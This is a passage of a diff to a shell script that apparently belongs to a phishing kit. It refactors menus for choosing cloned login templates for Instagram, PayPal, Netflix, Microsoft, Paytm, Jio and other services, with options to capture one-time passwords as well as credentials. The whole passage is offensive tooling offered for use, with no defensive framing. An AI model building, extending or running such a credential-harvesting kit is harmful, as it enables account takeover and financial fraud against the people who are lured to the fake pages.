+                        { sleep 1; banner; login_gpay; };;
+        esac
 }
 #icloud
-site_icloud(){
-website="icloud"
-rdurl="www.icloud.com/"
-siname="iCloud"
-dgfname="icloud"
-tunnelmenu
+login_icloud(){
+        site_id="icloud"
+        rdurl="www.icloud.com/"
+        site_name="iCloud"
+        dgfname="icloud"
+        capture_type="NOTP"
+        site_template="Default"
 }
 #instagram
-site_instagram(){
-siname="Instagram"
-rdurl="www.instagram.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} Instagram - WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} Instagram - WITH OTP ${NC}"
-echo -e "${BLUE}[03]${CYAN} Instagram Advanced - WITHOUT OTP ${NC}"
-echo -e "${BLUE}[04]${CYAN} Instagram Advanced - WITH OTP ${NC}"
-echo -e "${BLUE}[05]${CYAN} Instagram Autoliker - WITHOUT OTP ${NC}"
-echo -e "${BLUE}[06]${CYAN} Instagram Autoliker- WITH OTP ${NC}"
-echo -e "${BLUE}[07]${CYAN} Instagram Followers - WITHOUT OTP ${NC}"
-echo -e "${BLUE}[08]${CYAN} Instagram Followers - WITH OTP ${NC}"
-echo -e "${BLUE}[09]${CYAN} Instagram Verify - WITHOUT OTP ${NC}"
-echo -e "${BLUE}[10]${CYAN} Instagram Old - WITHOUT OTP ${NC}"
-echo -e "${BLUE}[11]${CYAN} Instagram Old - WITH OTP ${NC}"
-echo -e "${BLUE}[12]${CYAN} Instagram Video - WITHOUT OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_instagram(){
+        site_name="Instagram"
+        rdurl="www.instagram.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} Instagram - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} Instagram - WITH OTP ${NC}"
+        echo -e "${BLUE}[03]${CYAN} Instagram Advanced - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[04]${CYAN} Instagram Advanced - WITH OTP ${NC}"
+        echo -e "${BLUE}[05]${CYAN} Instagram Autoliker - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[06]${CYAN} Instagram Autoliker- WITH OTP ${NC}"
+        echo -e "${BLUE}[07]${CYAN} Instagram Followers - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[08]${CYAN} Instagram Followers - WITH OTP ${NC}"
+        echo -e "${BLUE}[09]${CYAN} Instagram Verify - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[10]${CYAN} Instagram Old - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[11]${CYAN} Instagram Old - WITH OTP ${NC}"
+        echo -e "${BLUE}[12]${CYAN} Instagram Video - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="instagram"
-                sitype="Default"
-                dgfname="instagram"
-                tunnelmenu;;
-        2 | 02)
-                website="instagram/otp"
-                sitype="OTP"
-                dgfname="instagram"
-                tunnelmenu;;
-        3 | 03)
-                website="ig_advanced"
-                sitype="Advanced"
-                dgfname="ig_advanced"
-                tunnelmenu;;
-        4 | 04)
-                website="ig_advanced/otp"
-                sitype="Advanced/OTP"
-                dgfname="ig_advanced"
-                tunnelmenu;;
-        5 | 05)
-                website="ig_autoliker"
-                sitype="Autoliker"
-                dgfname="ig_autoliker"
-                tunnelmenu;;
-        6 | 06)
-                website="ig_autoliker/otp"
-                sitype="Autoliker/OTP"
-                dgfname="ig_autoliker"
-                tunnelmenu;;
-        7 | 07)
-                website="ig_followers"
-                sitype="Followers"
-                dgfname="ig_followers"
-                tunnelmenu;;
-	8 | 08)
-                website="ig_followers/otp"
-                sitype="Followers/OTP"
-                dgfname="ig_followers"
-                tunnelmenu;;
-	9 | 09)
-                website="ig_verify"
-                rdurl="login3.html"
-                sitype="Verify"
-                dgfname="ig_verify"
-                tunnelmenu;;
-	10)
-                website="ig_old"
-                sitype="Old"
-                dgfname="ig_old"
-                tunnelmenu;;
-        11)
-                website="ig_old/otp"
-                sitype="Old/OTP"
-                dgfname="ig_old"
-                tunnelmenu;;
-	12)
-	        website="ig_video"
-                sitype="Video"
-                dgfname="ig_video"
-	        tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_instagram; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="instagram"
+                        capture_type="NOTP"
+                        site_template="Default"
+                        dgfname="instagram" ;;
+                2 | 02)
+                        site_id="instagram/otp"
+                        capture_type="POTP"
+                        site_template="OTP"
+                        dgfname="instagram" ;;
+                3 | 03)
+                        site_id="ig_advanced"
+                        capture_type="NOTP"
+                        site_template="Advanced"
+                        dgfname="ig_advanced" ;;
+                4 | 04)
+                        site_id="ig_advanced/otp"
+                        capture_type="POTP"
+                        site_template="Advanced/OTP"
+                        dgfname="ig_advanced" ;;
+                5 | 05)
+                        site_id="ig_autoliker"
+                        capture_type="NOTP"
+                        site_template="Autoliker"
+                        dgfname="ig_autoliker" ;;
+                6 | 06)
+                        site_id="ig_autoliker/otp"
+                        capture_type="POTP"
+                        site_template="Autoliker/OTP"
+                        dgfname="ig_autoliker" ;;
+                7 | 07)
+                        site_id="ig_followers"
+                        capture_type="NOTP"
+                        site_template="Followers"
+                        dgfname="ig_followers" ;;
+                8 | 08)
+                        site_id="ig_followers/otp"
+                        capture_type="POTP"
+                        site_template="Followers/OTP"
+                        dgfname="ig_followers" ;;
+                9 | 09)
+                        site_id="ig_verify"
+                        capture_type="NOTP"
+                        rdurl="login3.html"
+                        site_template="Verify"
+                        dgfname="ig_verify" ;;
+                10)
+                        site_id="ig_old"
+                        capture_type="NOTP"
+                        site_template="Old"
+                        dgfname="ig_old" ;;
+                11)
+                        site_id="ig_old/otp"
+                        capture_type="POTP"
+                        site_template="Old/OTP"
+                        dgfname="ig_old" ;;
+                12)
+                        site_id="ig_video"
+                        capture_type="NOTP"
+                        site_template="Video"
+                        dgfname="ig_video" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_instagram; };;
+        esac
 }
 #jazz
-site_jazz(){
-website="jazz"
-rdurl="jazz.com.pk/"
-siname="Jazz"
-dgfname="jazz"
-sitype="Default"
-tunnelmenu
+login_jazz(){
+        site_id="jazz"
+        rdurl="jazz.com.pk/"
+        site_name="Jazz"
+        dgfname="jazz"
+        capture_type="OOTP"
+        site_template="Default"
 }
 #jio
-site_jio(){
-siname="JIO"
-rdurl="www.jio.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} SIM ${NC}"
-echo -e "${BLUE}[02]${CYAN} Offer ${NC}"
-echo -e "${BLUE}[03]${CYAN} Router - WITHOUT OTP ${NC}"
-echo -e "${BLUE}[04]${CYAN} Router - WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_jio(){
+        site_name="JIO"
+        rdurl="www.jio.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} SIM ${NC}"
+        echo -e "${BLUE}[02]${CYAN} Offer ${NC}"
+        echo -e "${BLUE}[03]${CYAN} Router - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[04]${CYAN} Router - WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="jiosim"
-                sitype="Sim"
-                ipname="jiosim"
-                tunnelmenu;;
-        2 | 02)
-                website="jiooffer"
-                sitype="Offer"
-                dgfname="jiooffer"
-                tunnelmenu;;
-        3 | 03)
-                website="jiorouter"
-                rdurl="www.jio.com/business/jiofi"
-                sitype="Default"
-                tunnelmenu;;
-        4 | 04)
-                website="jiorouter/otp"
-                rdurl="www.jio.com/business/jiofi"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_jio; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="jiosim"
+                        capture_type="OOTP"
+                        site_template="Sim"
+                        dgfname="jiosim" ;;
+                2 | 02)
+                        site_id="jiooffer"
+                        capture_type="NOTP"
+                        site_template="Offer"
+                        dgfname="jiooffer" ;;
+                3 | 03)
+                        site_id="jiorouter"
+                        rdurl="www.jio.com/business/jiofi"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                4 | 04)
+                        site_id="jiorouter/otp"
+                        capture_type="POTP"
+                        rdurl="www.jio.com/business/jiofi"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_jio; };;
+        esac
 }
 #linkedin
-site_linkedin(){
-siname="Linkedin"
-dgfname="linkedin"
-rdurl="linkedin.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_linkedin(){
+        site_name="Linkedin"
+        dgfname="linkedin"
+        rdurl="linkedin.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="linkedin"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="linkedin/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_linkedin; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="linkedin"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="linkedin/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_linkedin; };;
+        esac
 }
 #mediafire
-site_mediafire(){
-siname="Medifire"
-dgfname="mediafire"
-rdurl="www.mediafire.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_mediafire(){
+        site_name="Medifire"
+        dgfname="mediafire"
+        rdurl="www.mediafire.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="mediafire"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="mediafire/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_mediafire; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="mediafire"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="mediafire/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_mediafire; };;
+        esac
 }
 #messenger
-site_messenger(){
-siname="Messenger"
-rdurl="www.messenger.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} Messenger - WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} Messenger - WITH OTP ${NC}"
-echo -e "${BLUE}[03]${CYAN} Messenger old - WITHOUT OTP ${NC}"
-echo -e "${BLUE}[04]${CYAN} Messenger old - WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_messenger(){
+        site_name="Messenger"
+        rdurl="www.messenger.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} Messenger - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} Messenger - WITH OTP ${NC}"
+        echo -e "${BLUE}[03]${CYAN} Messenger old - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[04]${CYAN} Messenger old - WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="messenger"
-                sitype="Default"
-                dgfname="messenger"
-                tunnelmenu;;
-        2 | 02)
-                website="messenger/otp"
-                sitype="OTP"
-                dgfname="messenger"
-                tunnelmenu;;
-        3 | 03)
-                website="messenger_old"
-                sitype="Old"
-                dgfname="messenger_old"
-                tunnelmenu;;
-        4 | 04)
-                website="messenger_old/otp"
-                sitype="Old/OTP"
-                dgfname="messenger_old"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_messenger; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="messenger"
+                        capture_type="NOTP"
+                        site_template="Default"
+                        dgfname="messenger" ;;
+                2 | 02)
+                        site_id="messenger/otp"
+                        capture_type="POTP"
+                        site_template="OTP"
+                        dgfname="messenger" ;;
+                3 | 03)
+                        site_id="messenger_old"
+                        capture_type="NOTP"
+                        site_template="Old"
+                        dgfname="messenger_old" ;;
+                4 | 04)
+                        site_id="messenger_old/otp"
+                        capture_type="POTP"
+                        site_template="Old/OTP"
+                        dgfname="messenger_old" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_messenger; };;
+        esac
 }
 #microsoft
-site_microsoft(){
-siname="Microsoft"
-dgfname="microsoft"
-rdurl="www.microsoft.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_microsoft(){
+        site_name="Microsoft"
+        dgfname="microsoft"
+        rdurl="www.microsoft.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="microsoft"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="microsoft/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_microsoft; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="microsoft"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="microsoft/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_microsoft; };;
+        esac
 }
 #mobiwik
-site_mobiwik(){
-website="mobiwik"
-rdurl="www.mobikwik.com/"
-siname="Mobiwik"
-dgfname="mobiwik"
-sitype="Default"
-tunnelmenu
+login_mobiwik(){
+        site_id="mobiwik"
+        rdurl="www.mobikwik.com/"
+        site_name="Mobiwik"
+        dgfname="mobiwik"
+        capture_type="OOTP"
+        site_template="Default"
 }
 #myspace
-site_myspace(){
-siname="MySpace"
-dgfname="myspace"
-rdurl="myspace.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_myspace(){
+        site_name="MySpace"
+        dgfname="myspace"
+        rdurl="myspace.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="myspace"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="myspace/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_myspace; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="myspace"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="myspace/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_myspace; };;
+        esac
 }
 #netflix
-site_netflix(){
-siname="Netflix"
-dgfname="netflix"
-rdurl="www.netflix.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_netflix(){
+        site_name="Netflix"
+        dgfname="netflix"
+        rdurl="www.netflix.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="netflix"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="netflix/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_netflix; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="netflix"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="netflix/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_netflix; };;
+        esac
 }
 #ola
-site_ola(){
-website="ola"
-rdurl="www.olacabs.com/"
-siname="OLA"
-dgfname="ola"
-sitype="Default"
-tunnelmenu
+login_ola(){
+        site_id="ola"
+        rdurl="www.olacabs.com/"
+        site_name="OLA"
+        dgfname="ola"
+        capture_type="OOTP"
+        site_template="Default"
 }
 #origin
-site_origin(){
-website="origin"
-rdurl="origin.onl"
-siname="Origin"
-dgfname="origin"
-sitype="Default"
-tunnelmenu
+login_origin(){
+        site_id="origin"
+        rdurl="origin.onl"
+        site_name="Origin"
+        dgfname="origin"
+        capture_type="NOTP"
+        site_template="Default"
 }
 #paypal
-site_paypal(){
-siname="Paypal"
-dgfname="paypal"
-rdurl="www.paypal.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_paypal(){
+        site_name="Paypal"
+        dgfname="paypal"
+        rdurl="www.paypal.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="paypal"
-                sitype="Default"
-                tunnelmenu;;
-        2 | 02)
-                website="paypal/otp"
-                sitype="OTP"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_paypal; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="paypal"
+                        capture_type="NOTP"
+                        site_template="Default" ;;
+                2 | 02)
+                        site_id="paypal/otp"
+                        capture_type="POTP"
+                        site_template="OTP" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_paypal; };;
+        esac
 }
 #paytm
-site_paytm(){
-siname="Paytm"
-rdurl="paytm.com"
-{ clear; banner; }
-echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-echo -e ""
-echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
-echo -e ""
-echo -e "${BLUE}[01]${CYAN} Paytm - WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} Paytm - WITH OTP ${NC}"
-echo -e "${BLUE}[03]${CYAN} Paytm offer - WITHOUT OTP ${NC}"
-echo -e "${BLUE}[04]${CYAN} Paytm Offer - WITH OTP ${NC}"
-echo -e " ${NC}"
-selected="Clifty/${siname}"
-uprompt;read -p "${prompt}" sichoice
+login_paytm(){
+        site_name="Paytm"
+        rdurl="paytm.com"
+        status_display
+        echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A TEMPLATE${NF} : ${NC}"
+        echo -e ""
+        echo -e "${BLUE}[01]${CYAN} Paytm - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[02]${CYAN} Paytm - WITH OTP ${NC}"
+        echo -e "${BLUE}[03]${CYAN} Paytm offer - WITHOUT OTP ${NC}"
+        echo -e "${BLUE}[04]${CYAN} Paytm Offer - WITH OTP ${NC}"
+        echo -e "${BLUE}[X]${RED} Back to MAIN MENU ${NC}"
+        echo -e " ${NC}"
+        read -p "${prompt}" reply_site
 
-case $sichoice in
-        1 | 01)
-                website="paytm"
-                sitype="Default"
-                dgfname="paytm"
-                tunnelmenu;;
-        2 | 02)
-                website="paytm/otp"
-                sitype="OTP"
-                dgfname="paytm"
-                tunnelmenu;;
-        3 | 03)
-                website="paytmoffer"
-                sitype="Offer"
-                dgfname="paytmoffer"
-                tunnelmenu;;
-        4 | 04)
-                website="paytmoffer/otp"
-                sitype="Offer/OTP"
-                dgfname="paytmoffer"
-                tunnelmenu;;
-        *)
-                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_paytm; };;
-esac
+        case $reply_site in
+                1 | 01)
+                        site_id="paytm"
+                        capture_type="NOTP"
+                        site_template="Default"
+                        dgfname="paytm" ;;
+                2 | 02)
+                        site_id="paytm/otp"
+                        capture_type="POTP"
+                        site_template="OTP"
+                        dgfname="paytm" ;;
+                3 | 03)
+                        site_id="paytmoffer"
+                        capture_type="NOTP"
+                        site_template="Offer"
+                        dgfname="paytmoffer" ;;
+                4 | 04)
+                        site_id="paytmoffer/otp"
+                        capture_type="POTP"
+                        site_template="Offer/OTP"
+                        dgfname="paytmoffer" ;;
+                X | x)
+                        menu_login;;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; banner; login_paytm; };;
+        esac
 }
 #phonepe
-site_phonepe(){
-website="phonepe"
-rdurl="www.phonepe.com/"
-siname="phonepe"
-dgfname="phonepay"
-sitype="Default"
-tunnelmenu
+login_phonepe(){
+        site_id="phonepe"
+        rdurl="www.phonepe.com/"
+        site_name="phonepe"
+        dgfname="phonepe"
